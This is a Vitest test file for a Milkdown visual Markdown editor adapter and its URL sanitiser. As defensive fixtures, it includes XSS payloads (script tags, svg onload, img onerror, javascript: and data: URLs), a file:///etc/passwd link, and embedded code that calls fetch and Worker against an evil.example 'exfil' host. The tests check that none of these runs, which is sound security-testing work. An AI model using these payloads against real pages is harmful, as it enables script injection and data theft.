import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { mount } from "@vue/test-utils";
import { createDocumentEngine, semanticNormalize } from "@glyphquire/document-engine";
import VisualEditor from "../../components/visual/VisualEditor.vue";
import { MilkdownVisualAdapter } from "./MilkdownVisualAdapter.js";
import { resolveVisualUrl } from "./schema.js";

const engine = createDocumentEngine();
const fixturesRoot = resolve(process.cwd(), "../../packages/document-engine/tests/fixtures");

function fixture(group: string, name: string): string {
  return readFileSync(resolve(fixturesRoot, group, name, "input.md"), "utf8");
}

async function mountedAdapter(markdown?: string) {
  const host = document.createElement("div");
  host.dataset.glyphquireTestHost = "";
  document.body.appendChild(host);
  const adapter = new MilkdownVisualAdapter();
  adapter.mount(host);
  await adapter.whenReady();
  if (markdown !== undefined) adapter.setMarkdown(markdown);
  return { adapter, host };
}

async function nextListenerFlush(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 250));
}

describe("MilkdownVisualAdapter", () => {
  const cleanups: Array<() => void> = [];

  afterEach(() => {
    while (cleanups.length > 0) cleanups.pop()?.();
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    for (const host of document.querySelectorAll("[data-glyphquire-test-host]")) host.remove();
    delete (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel;
    delete (globalThis as Record<string, unknown>).__glyphquireImportSpy;
  });

  it("mounts Milkdown behind the EditorAdapter seam and focuses its ProseMirror surface", async () => {
    const { adapter, host } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());

    expect(host.querySelector(".milkdown .ProseMirror")).not.toBeNull();
    adapter.focus();
    expect(document.activeElement).toBe(host.querySelector(".ProseMirror"));
  });

  it("silently projects authoritative Markdown and preserves semantic AST", async () => {
    const markdown = fixture("callout", "valid-full");
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);

    adapter.setMarkdown(markdown);
    await nextListenerFlush();

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected accepted documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
    expect(listener).not.toHaveBeenCalled();
  });

  it("rejects a fatal projection without replacing the last accepted Markdown", async () => {
    const accepted = fixture("sticky", "valid-minimal");
    const { adapter } = await mountedAdapter(accepted);
    cleanups.push(() => adapter.destroy());

    expect(() => adapter.setMarkdown("# Missing spec marker")).toThrow(
      "Visual projection requires accepted GlyphQuire Markdown",
    );
    expect(engine.parse(adapter.getMarkdown()).ok).toBe(true);
    expect(adapter.getMarkdown()).toBe(engine.serialize(engine.parse(accepted).document!));
  });

  it("blocks user control edits while read-only and emits one canonical change when writable", async () => {
    const { adapter, host } = await mountedAdapter(fixture("p5", "valid-minimal"));
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);
    const source = host.querySelector<HTMLTextAreaElement>("[data-glyphquire-runtime-source]");
    expect(source).not.toBeNull();

    adapter.setReadOnly(true);
    expect(source?.disabled).toBe(true);
    if (source) {
      source.value = "globalThis.READ_ONLY_FORGED = true";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).not.toContain("READ_ONLY_FORGED");
    expect(listener).not.toHaveBeenCalled();

    adapter.setReadOnly(false);
    expect(source?.disabled).toBe(false);
    if (source) {
      source.value = "function setup() { createCanvas(10, 10); }";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).toContain("createCanvas(10, 10)");
    expect(listener).toHaveBeenCalledTimes(1);
  });

  it("renders valid tabs and columns in source order and admits only legal structural children", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "::::tabs",
      ':::tab{title="First"}',
      "Alpha",
      ":::",
      ':::tab{title="Second"}',
      "Beta",
      ":::",
      "::::",
      "",
      '::::columns{count="2"}',
      ":::column",
      "Left",
      ":::",
      ":::column",
      "Right",
      ":::",
      "::::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(
      [...host.querySelectorAll("[data-glyphquire-node='tab']")].map((node) =>
        node.querySelector("[data-glyphquire-tab-title]")?.getAttribute("value"),
      ),
    ).toEqual(["First", "Second"]);
    expect(
      [...host.querySelectorAll("[data-glyphquire-node='column']")].map(
        (node) => node.textContent?.includes("Left") || node.textContent?.includes("Right"),
      ),
    ).toEqual([true, true]);
    expect(adapter.canContainForTests("tabs", "tab")).toBe(true);
    expect(adapter.canContainForTests("tabs", "paragraph")).toBe(false);
    expect(adapter.canContainForTests("columns", "column")).toBe(true);
    expect(adapter.canContainForTests("columns", "tab")).toBe(false);
  });

  it("escapes raw HTML and unknown or invalid blocks into lossless warning nodes", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      '<script>globalThis.__glyphquireRuntimeSentinel = "script"</script>',
      "",
      "<svg onload=\"globalThis.__glyphquireRuntimeSentinel = 'svg'\"></svg>",
      "",
      ':::future{x="1" handler="<img src=x onerror=boom()>"}',
      "Keep **every** child.",
      ":::",
      "",
      ':::callout{type="critical" handler="<script>boom()</script>"}',
      "Invalid child.",
      ":::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(host.querySelectorAll("[data-glyphquire-warning]").length).toBeGreaterThanOrEqual(4);
    expect(host.querySelector("script, svg, iframe, [onload], [onerror]")).toBeNull();
    expect(host.textContent).toContain("<script>");
    expect(host.textContent).toContain("future");
    expect(host.textContent).toContain("handler");

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected recoverable documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("removes hostile rendered URL sinks and hardens safe external links", async () => {
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "[Hostile link](javascript:globalThis.__glyphquireRuntimeSentinel=1)",
      "",
      "![Hostile image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
      "",
      "[Safe external](https://docs.example/guide)",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    const hostileLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Hostile link",
    );
    const safeLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Safe external",
    );
    const hostileImage = host.querySelector<HTMLImageElement>('img[alt="Hostile image"]');

    expect(hostileLink?.hasAttribute("href")).toBe(false);
    expect(hostileImage?.hasAttribute("src")).toBe(false);
    expect(safeLink?.getAttribute("href")).toBe("https://docs.example/guide");
    expect(safeLink?.getAttribute("target")).toBe("_blank");
    expect(safeLink?.getAttribute("rel")).toBe("noopener noreferrer");

    hostileLink?.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBeUndefined();
    expect(openSpy).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps p5 and canvas source entirely inert with no execution or capability calls", async () => {
    const fetchSpy = vi.fn();
    const workerSpy = vi.fn();
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const importSpy = vi.fn();
    const createElement = document.createElement.bind(document);
    const activeElementSpy = vi.spyOn(document, "createElement").mockImplementation(((
      tagName: string,
      options?: ElementCreationOptions,
    ) => {
      if (["script", "iframe", "object", "embed"].includes(tagName.toLowerCase())) {
        throw new Error(`active element requested: ${tagName}`);
      }
      return createElement(tagName, options);
    }) as typeof document.createElement);
    vi.stubGlobal("fetch", fetchSpy);
    vi.stubGlobal("Worker", workerSpy);
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = 0;
    (globalThis as Record<string, unknown>).__glyphquireImportSpy = importSpy;

    const source = [
      "globalThis.__glyphquireRuntimeSentinel += 1;",
      'document.body.append(document.createElement("iframe"));',
      'window.open("https://evil.example/");',
      'fetch("https://evil.example/exfil");',
      'new Worker("https://evil.example/worker.js");',
      'import("data:text/javascript,globalThis.__glyphquireImportSpy()")',
    ].join("\n");
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      ':::p5{height="400" network="javascript:alert(1)" autoplay="true"}',
      "```js",
      source,
      "```",
      ":::",
      "",
      ':::canvas{height="200" network="//evil.example/x"}',
      "```js",
      source,
      "```",
      ":::",
      "",
    ].join("\n");

    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    await nextListenerFlush();

    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBe(0);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(workerSpy).not.toHaveBeenCalled();
    expect(openSpy).not.toHaveBeenCalled();
    expect(importSpy).not.toHaveBeenCalled();
    expect(activeElementSpy).not.toHaveBeenCalledWith(
      expect.stringMatching(/^(script|iframe|object|embed)$/i),
      expect.anything(),
    );
    expect(host.querySelector("canvas, script, iframe, object, embed")).toBeNull();
    expect(host.querySelectorAll("[data-glyphquire-runtime-placeholder]")).toHaveLength(2);
    expect(adapter.getMarkdown()).toContain(source);
  });

  it("tears down Milkdown and rejects further mounted-only operations", async () => {
    const { adapter, host } = await mountedAdapter(fixture("toggle", "valid-minimal"));
    adapter.destroy();

    expect(host.querySelector(".milkdown")).toBeNull();
    expect(() => adapter.focus()).toThrow("MilkdownVisualAdapter is not mounted");
    expect(() => adapter.destroy()).not.toThrow();
  });
});

describe("central visual URL policy", () => {
  const baseUrl = "https://app.glyphquire.test/workbench";

  it.each([
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "javascript%3Aalert(1)",
    "javascript%253Aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "blob:https://app.glyphquire.test/id",
    "//evil.example/path",
    "\\\\evil.example\\path",
    "https://user:password@evil.example/path",
    "https%3A%2F%2Fevil.example/path",
    "\u0000https://evil.example/path",
  ])("rejects hostile or ambiguous link URLs: %s", (url) => {
    expect(resolveVisualUrl(url, "link", baseUrl)).toBeNull();
  });

  it("applies safe external link relationship and target attributes", () => {
    expect(resolveVisualUrl("https://docs.example/guide", "link", baseUrl)).toEqual({
      href: "https://docs.example/guide",
      external: true,
      rel: "noopener noreferrer",
      target: "_blank",
    });
    expect(resolveVisualUrl("/notes/one", "link", baseUrl)).toEqual({
      href: "/notes/one",
      external: false,
    });
  });

  it("allows only passive HTTP(S) or relative image locations", () => {
    expect(resolveVisualUrl("https://cdn.example/image.png", "image", baseUrl)?.href).toBe(
      "https://cdn.example/image.png",
    );
    expect(resolveVisualUrl("/assets/image.png", "image", baseUrl)?.href).toBe("/assets/image.png");
    expect(resolveVisualUrl("mailto:person@example.com", "image", baseUrl)).toBeNull();
    expect(
      resolveVisualUrl("data:image/svg+xml,<svg onload=alert(1)>", "image", baseUrl),
    ).toBeNull();
  });
});

describe("VisualEditor", () => {
  it("defaults to a fail-safe read-only Milkdown projection", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("callout", "valid-minimal") },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("false");
    });
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });

  it("grants editing only when explicitly authorized and keeps projections silent", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("sticky", "valid-minimal"), readOnly: false },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("true");
    });
    await wrapper.setProps({ markdown: fixture("toggle", "valid-minimal") });
    await nextListenerFlush();
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });
});
